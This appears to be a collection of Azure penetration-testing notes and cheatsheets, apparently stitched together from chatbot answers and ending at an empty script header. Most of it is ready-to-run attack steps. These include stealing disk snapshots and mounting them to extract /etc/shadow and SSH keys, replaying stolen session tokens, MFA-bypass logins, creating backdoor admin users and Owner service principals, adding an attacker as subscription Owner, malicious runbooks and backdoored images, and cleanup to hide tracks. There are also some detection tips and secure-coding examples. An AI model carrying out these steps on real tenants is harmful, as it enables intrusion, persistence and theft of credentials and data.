# Azure Disks

Here is the **corrected, rewritten, and Azure-adapted version** of your
EBS-focused enumeration and exploitation notes—**now in the context of
Azure Penetration Testing** with **Managed Disks and Snapshots** as the
target:

**🧱 Azure Disk Services (Equivalent to AWS EBS)**

**🔹 Overview**

- **Azure Managed Disks** are block storage volumes used with Azure
  Virtual Machines.

- Disks can be attached/detached like hard drives.

- Disks can be backed up as **Snapshots** or converted into **Images**.

- A malicious actor with the proper IAM permissions can exfiltrate data
  from these snapshots by creating a new disk and attaching it to a
  controlled VM.

**Enumeration**

**🔹 List All Managed Disks**

az disk list -o table

**🔹 Check if a Disk is Encrypted**

az disk show --name \<disk_name\> --resource-group \<rg\> --query
'encryption'

**🔹 List All Snapshots**

az snapshot list -o table

**🔹 Check if a Snapshot is Encrypted**

az snapshot show --name \<snapshot_name\> --resource-group \<rg\>
--query 'encryption'

**💥 Exploitation & Data Exfiltration**

**📌 Prerequisites:**

- Role with permission to read disks and snapshots
  (Microsoft.Compute/disks/\*, Microsoft.Compute/snapshots/\*).

- Permissions to create and attach disks to VMs.

**🔹 Step-by-Step Exploitation Workflow**

**1️⃣ Create a Snapshot from a Target Disk**

az snapshot create \\

--resource-group \<target_rg\> \\

--source \<target_disk_id\> \\

--name \<new_snapshot_name\>

**2️⃣ Create a New Disk from the Snapshot**

az disk create \\

--resource-group \<attacker_rg\> \\

--name \<new_disk_name\> \\

--source \<snapshot_id\> \\

--location \<region\>

⚠️ Must be in the **same region** as the target VM to attach!

**3️⃣ Attach the New Disk to an Attacker-Controlled VM**

az vm disk attach \\

--resource-group \<rg\> \\

--vm-name \<vm_name\> \\

--name \<new_disk_name\>

**4️⃣ Mount the Disk Inside the VM (Linux Example)**

On the attacker-controlled VM:

sudo fdisk -l \# Identify new disk (e.g., /dev/sdc)

sudo mkdir /mnt/loot

sudo mount /dev/sdc1 /mnt/loot

You now have access to the exfiltrated disk data.

**🔁 Alternative Exploitation Scenarios**

- **Read but no login access:** If you can't access the original VM but
  can create snapshots, you can still steal data by attaching snapshots
  to another VM.

- **Lateral movement:** Enumerate and attach disks from other resource
  groups if cross-RG privileges are present.

- **Bypass:** Use snapshot+image to create a new VM (if allowed) to
  maintain persistence.

**🛡️ Persistence Tactic (Optional)**

- Create a **new image** from a snapshot with your own backdoor or
  beacon.

az image create \\

--resource-group \<rg\> \\

--name \<malicious_image_name\> \\

--source \<snapshot_id\>

- Deploy future VMs from this backdoored image.

Would you like this formatted into a full Azure PenTest playbook PDF or
Markdown file for quick reference?

## Export Disk Through SAS URL

Technique **"Export Disk Through SAS URL"** for an Azure Penetration
Testing context:

**💿 Export Azure Managed Disk via SAS URL (Forensic Imaging / Data
Exfiltration)**

**🛠️ Use Case:**

If the attacker has **Contributor** or **Disk-level RBAC** on an Azure
VM or its disk, they can export the OS or data disk using a **Shared
Access Signature (SAS)** URL. This enables downloading the full VHD file
for offline analysis or lateral movement.

**🔹 \[CLI\] Generate SAS URL for a Managed Disk**

az disk grant-access \\

--resource-group \<resource-group-name\> \\

--name \<disk-name\> \\

--duration-in-seconds \<duration-seconds\> \\

--access-level Read \\

--query 'accessSas' -o tsv

✅ **Result**: A time-limited URL (with .vhd extension) which can be
used to download the disk.

**🔹 \[PowerShell\] Generate SAS URL (Alternative)**

\$disk = Get-AzDisk -ResourceGroupName "\<resource-group-name\>"
-DiskName "\<disk-name\>"

\$sasToken = Grant-AzDiskAccess -DiskId \$disk.Id -AccessLevel Read
-DurationInSecond \<duration-seconds\>

\$diskUrl = \$disk.DiskUri + \$sasToken.AccessSAS

\$diskUrl

**🔹 \[Terraform\] Automate Export via SAS**

Terraform module snippet:

resource "azurerm_managed_disk" "target_disk" {

name = "target-disk"

resource_group_name = var.resource_group

location = var.location

storage_account_type = "Standard_LRS"

create_option = "Import"

source_uri = var.source_vhd_url

}

Optional automation to **grant SAS access** via a script or custom
provider logic.

**⚠️ Detection & Prevention**

- Log and alert on:

  - Microsoft.Compute/disks/beginGetAccess/action

- Prevent with:

  - Role-based access control (deny Microsoft.Compute/disks/\* to
    untrusted users)

  - Azure Policy to restrict disk export

  - Defender for Cloud alerts on disk operations

## Azure Disk Export via SAS URL

Here's a corrected, rewritten, and summarized version of your content in
the context of **Azure Penetration Testing**, focusing on how attackers
might exploit misconfigured SAS URLs and how to identify and secure such
vectors:

**🔓 Azure Disk Export via SAS URL – Penetration Testing Perspective**

**Overview:**\
In Azure, exporting a managed disk via a **Shared Access Signature (SAS)
URL** is a legitimate operation used for migration or backup. However,
when misconfigured, this feature becomes a serious security risk,
allowing attackers to **exfiltrate entire virtual disk contents**
without authentication.

**🚨 Vulnerable Pattern (Noncompliant Code)**

from azure.storage.blob import BlobServiceClient

def export_disk_to_sas_url(disk_name, container_name,
storage_account_name, storage_account_key):

blob_service_client =
BlobServiceClient(account_url=f"https://{storage_account_name}.blob.core.windows.net",
credential=storage_account_key)

container_client =
blob_service_client.get_container_client(container_name)

sas_url = container_client.get_blob_client(disk_name).url + '?' +
container_client.generate_shared_access_signature(permission='r',
expiry='2030-01-01')

return sas_url

**Attack Vector:**

- Hardcoded long-lived expiry (2030-01-01)

- No IP or protocol restrictions

- Overly permissive SAS token

- URL can be reused and shared anonymously

In a pentest, discovery of such a URL (via logs, storage account
enumeration, or leaked config) could allow **download of entire VM
disks**, potentially exposing credentials, SSH keys, or cached tokens.

**✅ Secure Implementation (Compliant Code)**

from azure.storage.blob import BlobServiceClient, BlobSasPermissions,
generate_blob_sas

from datetime import datetime, timedelta

def export_disk_to_sas_url(disk_name, container_name,
storage_account_name, storage_account_key):

blob_service_client =
BlobServiceClient(account_url=f"https://{storage_account_name}.blob.core.windows.net",
credential=storage_account_key)

container_client =
blob_service_client.get_container_client(container_name)

expiry_time = datetime.utcnow() + timedelta(days=7)

permissions = BlobSasPermissions(read=True)

sas_token = generate_blob_sas(

account_name=storage_account_name,

container_name=container_name,

blob_name=disk_name,

account_key=storage_account_key,

permission=permissions,

expiry=expiry_time

)

sas_url = container_client.get_blob_client(disk_name).url + '?' +
sas_token

return sas_url

**Security Improvements:**

- Short-lived token (7-day expiry)

- Read-only permissions

- Uses official generate_blob_sas function for granularity

- Better suited for logging and auditing

**🛡️ Pentest Tips**

**What to look for during a pentest:**

- Publicly exposed or leaked SAS URLs (e.g., in GitHub, logs, or config
  files)

- SAS tokens with excessive permissions or no expiry

- Misconfigured storage accounts (anonymous access enabled)

- Lack of Azure Monitor/Defender alerts on disk export events

**Recommended Mitigations:**

- Enforce short-lived, scoped SAS tokens with IP/protocol restrictions

- Log and alert on SAS URL generation and disk export actions

- Regularly audit SAS tokens and revoke unused ones

- Use managed identities and RBAC over access keys

Would you like a Burp or PowerShell script to automate scanning or
testing for exposed SAS URLs in a subscription?

## Burp or PowerShell script to automate scanning or testing for exposed SAS URLs in a subscription

Great! Here's a **PowerShell script** to **enumerate and test for
exposed Azure Storage SAS URLs** related to disk exports in a target
subscription. This can be used during an Azure penetration test to
detect misconfigured or publicly accessible disk blobs.

**🔍 PowerShell: Scan for Exposed SAS URLs in Azure Storage (Disk Export
Focus)**

\# Requires: Azure PowerShell Module (Az.Accounts, Az.Storage)

Connect-AzAccount

\$subscriptionId = "\<TARGET_SUBSCRIPTION_ID\>"

Select-AzSubscription -SubscriptionId \$subscriptionId

\# List all storage accounts in the subscription

\$storageAccounts = Get-AzStorageAccount

foreach (\$storageAccount in \$storageAccounts) {

Write-Host "\`n\[\*\] Checking storage account:
\$(\$storageAccount.StorageAccountName)"

\$ctx = \$storageAccount.Context

\$containers = Get-AzStorageContainer -Context \$ctx

foreach (\$container in \$containers) {

Write-Host " \[+\] Container: \$(\$container.Name)"

\$blobs = Get-AzStorageBlob -Container \$container.Name -Context \$ctx

foreach (\$blob in \$blobs) {

\# Check for VHD or disk images

if (\$blob.Name -like "\*.vhd" -or \$blob.Name -like "\*disk\*") {

\$sasToken = New-AzStorageBlobSASToken -Container \$container.Name \`

-Blob \$blob.Name -Permission r -ExpiryTime (Get-Date).AddMinutes(5) \`

-Context \$ctx -FullUri

Write-Host " \[!\] Found disk-like blob: \$(\$blob.Name)"

Write-Host " Test SAS URL: \$sasToken"

\# Optional: Test if URL is publicly accessible

try {

\$response = Invoke-WebRequest -Uri \$sasToken -Method Head -TimeoutSec
10

if (\$response.StatusCode -eq 200) {

Write-Host " \[!!\] Accessible Blob: \$sasToken" -ForegroundColor Red

} else {

Write-Host " \[-\] Not accessible anonymously"

}

} catch {

Write-Host " \[-\] Access denied or failed"

}

}

}

}

}

**🧪 What This Script Does**

- Connects to your target Azure subscription.

- Enumerates **all storage accounts and containers**.

- Looks for blob names likely related to disks (e.g., .vhd, disk).

- Generates a **short-lived SAS token**.

- Optionally tests for **public anonymous access** via HTTP HEAD.

**⚠️ Caution (Ethical Use Only)**

- Only use on assets you are authorized to test.

- Use Get-AzStorageAccountKey if required for private key-based
  enumeration.

- Disable anonymous blob access and long-lived SAS tokens in production
  environments.

Would you also like a Burp Suite extension or plugin idea for scanning
exposed SAS URLs in web apps or responses?

## Burp Suite Extension: Azure SAS URL Finder & Analyzer

**Burp Suite extension/plugin concept** for identifying **exposed or
insecure Azure SAS URLs**, especially targeting disk exports (.vhd) and
blob file access:

**🧩 Plugin Name: AzureSASInspector**

**💡 Purpose:**

Scan all HTTP responses for Azure Blob SAS URLs, then **analyse** and
**highlight insecure patterns** (long expiry, full access, missing IP
restrictions, disk export patterns, etc.).

**✅ Key Features**

1.  **Regex Detection:**

    - Searches for Azure Blob URLs with SAS tokens:

    - https://\<account\>.blob.core.windows.net/\<container\>/\<blob\>?\<sas_token\>

2.  **Risk Flags:**

    - Flags based on:

      - .vhd or .vhdx extensions (likely disk exports)

      - sig= present without se= (missing expiry)

      - Expiry (se=...) \> 7 days from now

      - Full permissions (sp=rw or sp=rwdlacup)

3.  **Automated Validation (optional toggle):**

    - Makes HEAD request to each detected SAS URL

    - Checks if accessible anonymously (200 OK)

4.  **Export/Report Mode:**

    - Dump all matched URLs to a CSV or HTML table with:

      - Risk rating (Low / Med / High)

      - Blob name

      - Expiry time

      - Permissions

      - Accessible? (Yes/No)

### 🛠️ Implementation Overview (Python / Jython)

Here’s a minimal prototype using Burp's extender API:

import re

import urllib.request

from datetime import datetime

from burp import IBurpExtender, IScannerCheck, IScanIssue

class BurpExtender(IBurpExtender, IScannerCheck):

def registerExtenderCallbacks(self, callbacks):

self.\_helpers = callbacks.getHelpers()

callbacks.setExtensionName("Azure SAS URL Inspector")

callbacks.registerScannerCheck(self)

def doPassiveScan(self, baseRequestResponse):

issues = \[\]

response = baseRequestResponse.getResponse()

if not response:

return None

response_info = self.\_helpers.analyzeResponse(response)

body = response\[response_info.getBodyOffset():\].tostring()

matches =
re.findall(r'https://\[a-z0-9\]+\\blob\\core\\windows\\net/\[^\s\\"\]+\\\[^
\\"\<\>\]+sig=\[^ \\"\<\>\]+', body)

for match in matches:

risk = self.assess_sas_url(match)

if risk:

issues.append(SASIssue(baseRequestResponse, match, risk))

return issues if issues else None

def assess_sas_url(self, url):

risk = ""

if ".vhd" in url:

risk += " \[Disk Export\]"

if "se=" in url:

expiry = re.search(r"se=(\[^&\]+)", url)

if expiry:

expiry_time = datetime.strptime(expiry.group(1), "%Y-%m-%dT%H:%M:%SZ")

if (expiry_time - datetime.utcnow()).days \> 7:

risk += " \[Long Expiry\]"

else:

risk += " \[No Expiry\]"

if "sp=rw" in url or "sp=rwdlacup" in url:

risk += " \[Overly Permissive\]"

return risk.strip()

class SASIssue(IScanIssue):

def \_\_init\_\_(self, baseRequestResponse, url, details):

self.\_baseRequestResponse = baseRequestResponse

self.\_url = url

self.\_details = details

def getUrl(self):

return self.\_baseRequestResponse.getHttpService()

def getIssueName(self):

return "Insecure Azure SAS URL"

def getIssueType(self):

return 0x08000000

def getSeverity(self):

return "High"

def getConfidence(self):

return "Firm"

def getIssueBackground(self):

return "SAS URLs grant access to Azure blobs. Misconfigured tokens may
lead to unauthorized access or data exfiltration."

def getRemediationBackground(self):

return "Use short-lived, permission-scoped SAS tokens with IP/protocol
restrictions."

def getIssueDetail(self):

return "The following insecure SAS URL was
found:\<br\>\<b\>{}\</b\>\<br\>Flags: {}".format(self.\_url,
self.\_details)

def getHttpMessages(self):

return \[self.\_baseRequestResponse\]

def getHttpService(self):

return self.\_baseRequestResponse.getHttpService()

**📦 Packaging Tips**

- Use **Jython standalone** if packaging as a .jar.

- Or, create a Burp Suite extension using **Python 3** via **Burp
  Collaborator / BApp Store (Pro version)**.

Would you like a ready-to-run .jar version or more Burp integration tips
(e.g., active scan rules or collaborator tricks)?

Here's a cleaned-up and rewritten version of the cheatsheet excerpt,
tailored specifically for **Azure Penetration Testing** scenarios,
including adversarial context like token reuse and bypassing MFA for
post-exploitation:

**🛠️ Azure Penetration Testing CLI Cheatsheet**

Adapted from the original by **Beau Bullock (@dafthack)**\
🔗 Source: [Cloud Pentest Cheatsheets
GitHub](https://github.com/dafthack/CloudPentestCheatsheets)

**📦 Az PowerShell Module Basics**

Ensure the Az module is available:

Import-Module Az

**🔐 Authentication Methods**

**Standard login (requires interactive/MFA if enforced):**

Connect-AzAccount

**Alternate login (may bypass MFA under certain misconfigurations):**

\$credential = Get-Credential

Connect-AzAccount -Credential \$credential

⚠️ Used during post-exploitation if password-only login is permitted.

**🎭 Token and Session Hijacking (Post-Exploitation)**

**Import a stolen/harvested Azure context (e.g., from compromised
host):**

Import-AzContext -Profile 'C:\Temp\LiveTokens\StolenToken.json'

**Export current authenticated session (for reuse or lateral
movement):**

Save-AzContext -Path 'C:\Temp\AzureAccessToken.json'

Useful for maintaining access or transferring session state across
attacker tools.

Would you like me to expand this with enumeration, privilege escalation,
or resource abuse commands as well?

Great! Here's an expanded **Azure Penetration Testing CLI Cheatsheet**,
organized by phase: **Authentication**, **Enumeration**, **Privilege
Escalation**, and **Resource Abuse** — all tailored for offensive
security practitioners.

**🛠️ Azure Penetration Testing CLI Cheatsheet (PowerShell)**

Focus: **Post-Exploitation, Enumeration, Persistence**

**🔐 1. Authentication & Session Hijacking**

**Import Az module:**

Import-Module Az

**Standard login (MFA may apply):**

Connect-AzAccount

**Password-only login (bypass MFA if misconfigured):**

\$cred = Get-Credential

Connect-AzAccount -Credential \$cred

**Session hijacking – import stolen token/session context:**

Import-AzContext -Profile 'C:\Loot\StolenToken.json'

**Export current session for reuse:**

Save-AzContext -Path 'C:\Loot\TokenBackup.json'

**2. Azure Resource & Identity Enumeration**

**🧑‍💼 Enumerate Azure AD Users:**

Get-AzADUser \| Select DisplayName, UserPrincipalName, Id

**👥 Enumerate Groups and Memberships:**

Get-AzADGroup

Get-AzADGroupMember -GroupObjectId \<GroupID\>

**☁️ List Subscriptions:**

Get-AzSubscription \| Select Name, Id, State

**📁 Switch Between Subscriptions:**

Set-AzContext -SubscriptionId \<SubID\>

**🏷️ Enumerate Resource Groups and Resources:**

Get-AzResourceGroup

Get-AzResource \| Select Name, ResourceType, Location

**🛠️ List All Role Assignments (Privilege Recon):**

Get-AzRoleAssignment \| Select DisplayName, RoleDefinitionName, Scope

**🚀 3. Privilege Escalation & Misconfig Discovery**

**🔑 List Service Principals (Identify AppId & Secrets):**

Get-AzADServicePrincipal \| Select DisplayName, AppId, Id

**🛠️ Enumerate Roles of Service Principals:**

Get-AzRoleAssignment -ObjectId \<SP_ObjectId\>

**📡 Check for Automation Accounts with Contributor Rights:**

Get-AzAutomationAccount

**📦 Extract Key Vault Names:**

Get-AzKeyVault \| Select Name, Location, ResourceGroupName

**🔓 Attempt Access to Secrets in a Key Vault:**

Get-AzKeyVaultSecret -VaultName \<VaultName\>

⚠️ Access depends on current user's/role's Key Vault policies.

**🔥 4. Resource Abuse / Persistence Opportunities**

**💾 Upload Malicious Script to Automation Account:**

Set-AzAutomationRunbook -AutomationAccountName \<Account\> -Name
\<RunbookName\> -Path 'Payload.ps1'

Start-AzAutomationRunbook -AutomationAccountName \<Account\> -Name
\<RunbookName\>

**💉 Create Backdoor User (if privileged):**

New-AzADUser -DisplayName "admin" -UserPrincipalName
"admin@domain.onmicrosoft.com" -AccountEnabled \$true -Password
"P@ssw0rd123!"

**📘 Deploy Malicious Function App:**

New-AzFunctionApp -ResourceGroupName \<RG\> -Name "BackdoorFunc"
-Location "eastus" -StorageAccountName \<Storage\>

**📡 Set Up Persistent Role Assignment:**

New-AzRoleAssignment -ObjectId \<AttackerId\> -RoleDefinitionName
"Owner" -Scope "/subscriptions/\<SubID\>"

**🧹 Cleanup (Optional / OPSEC)**

**Remove your backdoor accounts or role assignments:**

Remove-AzRoleAssignment -ObjectId \<AttackerId\> -RoleDefinitionName
"Owner"

Remove-AzADUser -ObjectId \<BackdoorUserId\>

## Azure Penetration Testing Cheatsheet – az CLI Version

Adapted for Offensive Security – Post-Exploitation & Enumeration\
**Azure Penetration Testing Cheatsheet (CLI Version)** using the az
command-line interface. This is tailored for offensive operations and
post-exploitation in Azure environments, focusing on **authentication**,
**enumeration**, **privilege escalation**, and **resource abuse**.

**🔐 1. Authentication & Access Control**

**Login (default browser-based):**

az login

**Login with username/password (may bypass MFA):**

az login -u username@domain.com -p 'SuperSecret!'

**Use a service principal (if creds obtained):**

az login --service-principal -u APP_ID -p CLIENT_SECRET --tenant
TENANT_ID

**Use access token (e.g., from token theft):**

az account get-access-token

**Set subscription context (required for many commands):**

az account set --subscription SUBSCRIPTION_ID

**2. Azure Resource & Identity Enumeration**

**👤 List Azure AD users:**

az ad user list --query "\[\].{Name:displayName, UPN:userPrincipalName}"

**👥 List Groups and Members:**

az ad group list --query "\[\].{Name:displayName, ID:objectId}"

az ad group member list --group GROUP_ID

**☁️ List Subscriptions:**

az account list --output table

**📁 List Resource Groups:**

az group list --query "\[\].{Name:name, Location:location}" --output
table

**📦 List Resources in All Groups:**

az resource list --output table

**🔐 List Role Assignments (RBAC reconnaissance):**

az role assignment list --all --output table

**🛠️ 3. Privilege Escalation Discovery**

**Enumerate Service Principals:**

az ad sp list --all --query "\[\].{Name:displayName, AppID:appId}"

**🔐 Enumerate App Secrets (if permissions allow):**

az ad app credential list --id APP_ID

**🔑 List Key Vaults:**

az keyvault list --output table

**🕵️ Attempt to list secrets in a Key Vault:**

az keyvault secret list --vault-name VAULT_NAME

**📂 Try to dump secrets:**

az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME

**🔥 4. Resource Abuse & Persistence**

**🧬 Deploy Malicious Function App:**

az functionapp create --resource-group RG --consumption-plan-location
eastus \\

--runtime powershell --name backdoorfunc --storage-account YOURSTORAGE

**🎯 Add Attacker as Subscription Owner (if permissions allow):**

az role assignment create --assignee ATTACKER_OBJECT_ID \\

--role "Owner" --scope /subscriptions/SUBSCRIPTION_ID

**🧑‍💻 Create New User in Azure AD:**

az ad user create --display-name attacker --user-principal-name
attacker@domain.com \\

--password P@ssw0rd123 --force-change-password-next-login false

**🧹 Cleanup (OPSEC)**

**🔒 Remove role assignment:**

az role assignment delete --assignee ATTACKER_OBJECT_ID --role "Owner"

**❌ Remove malicious user:**

az ad user delete --id attacker@domain.com

## 🛡️ Azure PenTest Cheatsheet – PowerShell (Az Module)

**Focus**: Account Discovery, Resource Enumeration, and Target
Identification

**🔐 1. Azure Context & Subscription Info**

**List saved contexts (including tokens):**

Get-AzContext -ListAvailable

**Get current context details:**

\$context = Get-AzContext

\$context.Name

\$context.Account

**List all accessible subscriptions:**

Get-AzSubscription

**Switch subscription context (critical for scoped access):**

Select-AzSubscription -SubscriptionId "SUBSCRIPTION_ID"

**Get role assignments for current identity:**

Get-AzRoleAssignment

**🗂️ 2. Resource & Infrastructure Enumeration**

**List all Azure resources:**

Get-AzResource

**List resource groups:**

Get-AzResourceGroup

**Enumerate storage accounts:**

Get-AzStorageAccount

**🌐 3. Web Apps & Identity Applications**

**List Azure AD applications (OAuth backdoor targets):**

Get-AzADApplication

**List Azure Web Apps (App Services):**

Get-AzWebApp

**4. SQL Server & Database Discovery**

**List Azure SQL servers:**

Get-AzSqlServer

**List SQL databases (per server):**

Get-AzSqlDatabase -ServerName "SERVER_NAME" -ResourceGroupName "RG_NAME"

**List SQL Server firewall rules (check for IP bypasses):**

Get-AzSqlServerFirewallRule -ServerName "SERVER_NAME" -ResourceGroupName
"RG_NAME"

**List Azure AD Admins on SQL Servers (lateral movement potential):**

Get-AzSqlServerActiveDirectoryAdministrator -ServerName "SERVER_NAME"
-ResourceGroupName "RG_NAME"

**⚙️ 5. Automation Account Recon (Runbooks)**

**List all Automation Accounts:**

Get-AzAutomationAccount

**List runbooks for a specific automation account:**

Get-AzAutomationRunbook -AutomationAccountName "ACCOUNT_NAME"
-ResourceGroupName "RG_NAME"

**Export a Runbook (inspect for credentials or logic flaws):**

Export-AzAutomationRunbook -AutomationAccountName "ACCOUNT_NAME" \`

-ResourceGroupName "RG_NAME" -Name "RUNBOOK_NAME" -OutputFolder
"C:\Temp"

Would you like this merged with the CLI version in a full field-ready
PDF or Markdown guide?

## 🛡️ Azure Penetration Testing Cheatsheet (PowerShell + CLI)

**🔑 1. Authentication & Session Handling**

**PowerShell (Az Module):**

\# Import the Az module

Import-Module Az

\# Authenticate interactively

Connect-AzAccount

\# Optional: Use credentials (may bypass MFA in some cases)

\$cred = Get-Credential

Connect-AzAccount -Credential \$cred

\# Import/export authentication context (for stolen sessions or replay)

Import-AzContext -Profile 'C:\Temp\LiveTokens\StolenToken.json'

Save-AzContext -Path 'C:\Temp\AzureAccessToken.json'

**📅 2. Account & Subscription Info**

\# List all available contexts

Get-AzContext -ListAvailable

\# Current context details

\$context = Get-AzContext

\$context.Name

\$context.Account

\# List all subscriptions

Get-AzSubscription

\# Switch subscription

Select-AzSubscription -SubscriptionId "\<SUBSCRIPTION_ID\>"

\# List role assignments (check privileges)

Get-AzRoleAssignment

**📂 3. Resource Discovery**

\# List all resources

Get-AzResource

\# List all resource groups

Get-AzResourceGroup

\# List storage accounts

Get-AzStorageAccount

**🌐 4. Web Apps & AAD Apps**

\# List Azure AD applications (client secrets, permissions)

Get-AzADApplication

\# List App Services (Web Apps)

Get-AzWebApp

**📊 5. SQL Server & Database Enumeration**

\# List SQL Servers

Get-AzSqlServer

\# List SQL Databases on a server

Get-AzSqlDatabase -ServerName \<SERVER_NAME\> -ResourceGroupName
\<RG_NAME\>

\# List firewall rules

Get-AzSqlServerFirewallRule -ServerName \<SERVER_NAME\>
-ResourceGroupName \<RG_NAME\>

\# List Azure AD Admins (lateral movement targets)

Get-AzSqlServerActiveDirectoryAdministrator -ServerName \<SERVER_NAME\>
-ResourceGroupName \<RG_NAME\>

**⚙️ 6. Runbook Discovery (Automation Accounts)**

\# List Automation Accounts

Get-AzAutomationAccount

\# List Runbooks in a specific Automation Account

Get-AzAutomationRunbook -AutomationAccountName \<ACCOUNT_NAME\>
-ResourceGroupName \<RG_NAME\>

\# Export Runbook for offline analysis

Export-AzAutomationRunbook -AutomationAccountName \<ACCOUNT_NAME\>
-ResourceGroupName \<RG_NAME\> -Name \<RUNBOOK_NAME\> -OutputFolder
"C:\Temp"

## Azure Penetration Testing Cheatsheet: VMs, Networking, and Backdoors

**🖥️ Virtual Machines**

**List all Virtual Machines**

Get-AzVM

**Get OS details for a specific VM**

\$vm = Get-AzVM -Name "VM-Name" -ResourceGroupName "RG-Name"

\$vm.OSProfile

**Execute commands on a VM (PowerShell script execution)**

Invoke-AzVMRunCommand -ResourceGroupName "RG-Name" -VMName "VM-Name" \`

-CommandId 'RunPowerShellScript' -ScriptPath './script.ps1'

⚠️ Requires sufficient privileges (e.g., Contributor or higher). Use
this to run enumeration or establish persistence.

**🌐 Networking**

**List Virtual Networks (VNets)**

Get-AzVirtualNetwork

**List Public IP Addresses**

Get-AzPublicIpAddress

**Get ExpressRoute Circuit Information**

Get-AzExpressRouteCircuit

**Get Azure VPN Connections**

Get-AzVpnConnection

Useful for mapping out hybrid infrastructure or pivoting opportunities.

**🕳️ Backdoor: Service Principal Creation**

Create a persistent Azure backdoor using a Service Principal with
**Owner** or **Company Administrator** role.

**Step 1: Create a new Service Principal**

\$spn = New-AzADServicePrincipal -DisplayName "WebService" -Role Owner

**Step 2: Extract the plaintext secret**

\$BSTR =
\[System.Runtime.InteropServices.Marshal\]::SecureStringToBSTR(\$spn.Secret)

\$UnsecureSecret =
\[System.Runtime.InteropServices.Marshal\]::PtrToStringAuto(\$BSTR)

\$UnsecureSecret

**Step 3: Elevate the SPN (if possible)**

\$sp = Get-MsolServicePrincipal -AppPrincipalId "\<AppID\>"

\$role = Get-MsolRole -RoleName "Company Administrator"

Add-MsolRoleMember -RoleObjectId \$role.ObjectId \`

-RoleMemberType ServicePrincipal -RoleMemberObjectId \$sp.ObjectId

**Step 4: Log in using the SPN**

\$cred = Get-Credential \# Use AppID as username and \$UnsecureSecret as
password

Connect-AzAccount -Credential \$cred -Tenant "\<Tenant-ID\>"
-ServicePrincipal

🎯 **Persistence tip**: This SPN remains active unless explicitly
removed—use it for re-entry.

Would you like me to append privilege escalation tactics or detection
evasion tips for this section?

## 📘 Azure PenTest Cheatsheet: MSOnline PowerShell Module

The **MSOnline** module is especially useful for targeting **Azure AD**
in legacy environments or where **MFA bypass** may be possible.

**🛠️ Setup & Authentication**

**Import the MSOnline module:**

Import-Module MSOnline

**Standard login:**

Connect-MsolService

**Alternate login to bypass MFA (if possible):**

\$credential = Get-Credential

Connect-MsolService -Credential \$credential

🛑 Note: This method may work when MFA is misconfigured or conditional
access is overly permissive.

**🧾 Account & Directory Recon**

**📌 Tenant & Company Info**

Get-MsolCompanyInformation

**👤 List All Users**

Get-MsolUser -All

**👥 List All Groups**

Get-MsolGroup -All

**🔐 List Members of Privileged Roles (e.g., Global Admins)**

\$role = Get-MsolRole -RoleName "Company Administrator"

Get-MsolRoleMember -RoleObjectId \$role.ObjectId

**Enumerate User Attributes**

Get-MsolUser -All \| Format-List

Useful for spotting exposed metadata like phone numbers, job roles,
departments, or credential hints.

**🎭 Service Principals (Applications / Backdoors)**

**List all Azure AD Service Principals:**

Get-MsolServicePrincipal

These represent applications that can be abused for persistence,
automation, or privilege escalation.

**🧪 One-liner: Search Azure AD for Leaked Credentials**

Scan all user object properties for strings containing "password":

\$users = Get-MsolUser -All

foreach (\$user in \$users) {

\$props = \$user \| Get-Member -MemberType Properties \| Select-Object
-ExpandProperty Name

foreach (\$prop in \$props) {

if (\$user.\$prop -like "\*password\*") {

Write-Output "\[\*\] \$(\$user.UserPrincipalName) \[\$prop\] :
\$(\$user.\$prop)"

}

}

}

**Goal:** Identify accidental password exposure in attributes like
Notes, CustomAttributes, or legacy fields.

Would you like a companion section using the **AzureAD** module as well
(which sometimes exposes more attributes)?

Here is a cleaned-up, corrected, and **Azure Penetration
Testing–focused** rewrite of the **Az CLI Tool** and related tools
section:

**🧰 Azure PenTest Cheatsheet: Az CLI & Related Tools**

This section covers key Az CLI commands and third-party tools used
during Azure penetration testing to enumerate, escalate, and exfiltrate
cloud resources.

**Authentication via Az CLI**

az login

📌 Use this to authenticate interactively or via a stolen refresh
token/service principal.

## Azure Pentest CLI Cheat sheet (Az CLI + Tools)

**Authentication**

az login \# Interactive login (opens browser)

az login --username user --password pw \# Non-MFA environments

# Azure – Mount a Restored Managed Disk (Snapshot) to a Linux VM (Forensic/Exfil Use)

Here's a rewritten, corrected, and Azure-specific version of your
instructions in the context of an **Azure penetration test**, focusing
on **mounting a restored managed disk (from a snapshot) to a Linux VM**
to analyze or extract data.

------------------------------------------------------------------------

**🔓**

During a penetration test, gaining access to Azure-managed disk
snapshots can lead to full recovery of VM disk content. If the
compromised credentials allow snapshot or disk access, you can restore
and mount the disk to a VM you control for offline analysis or lateral
movement.

------------------------------------------------------------------------

**⚠️ Note on Azure Snapshots**

Azure disk snapshots are full point-in-time copies of managed disks, not
incremental like AWS EBS. Restoring a disk requires creating a new
managed disk from the snapshot.

------------------------------------------------------------------------

**🧭 Step-by-Step: Mount Azure Snapshot to a Linux VM**

**1. Create a Managed Disk from the Snapshot**

az disk create \\

--resource-group \<rg-name\> \\

--name restoredDisk01 \\

--source \<snapshot-id-or-name\>

**2. Attach Disk to Target VM**

az vm disk attach \\

--vm-name \<vm-name\> \\

--resource-group \<rg-name\> \\

--name restoredDisk01

**3. SSH into the Linux VM**

ssh azureuser@\<vm-ip\>

**4. List Disks to Identify New Device**

lsblk

You should see a new device (e.g., /dev/sdc, /dev/sdd, or /dev/sdX) that
wasn’t there before.

------------------------------------------------------------------------

**Optional: Check If It’s a Valid Filesystem or Needs Formatting**

sudo file -s /dev/sdc

- If output shows a filesystem (like ext4, xfs), it’s ready to mount.

- If not, avoid formatting during a Pentest unless needed — it may
  destroy data.

------------------------------------------------------------------------

**5. Create Mount Directory**

sudo mkdir /mnt/restore

**6. Mount the Disk**

sudo mount /dev/sdc1 /mnt/restore

If there’s no partition (e.g., /dev/sdc1 doesn’t exist), try /dev/sdc.

------------------------------------------------------------------------

**7. Verify Mount and Explore Content**

cd /mnt/restore

df -h .

ls -lah

------------------------------------------------------------------------

**🛡️ Pentest Use Cases**

- Offline password hash extraction (e.g., /etc/shadow)

- Recovery of SSH keys, app secrets, config files

- Lateral movement or privilege escalation via hardcoded credentials

------------------------------------------------------------------------

Would you like an automated script for restoring and mounting disks as
part of your Azure post-exploitation toolkit?

Great — here’s a **fully automated script** to restore and mount a disk
from an Azure snapshot onto a Linux VM, for use during a
**post-exploitation phase** of an Azure penetration test.

------------------------------------------------------------------------

**🧰 Automated Azure Snapshot Restore & Mount Script (Bash + Azure
CLI)**

**Prerequisites**

- Azure CLI logged in (az login) or SP creds (az login
  --service-principal ...)

- Permissions: Microsoft.Compute/disks/write, .../snapshots/read,
  .../virtualMachines/write

------------------------------------------------------------------------

**📜 restore_and_mount.sh**

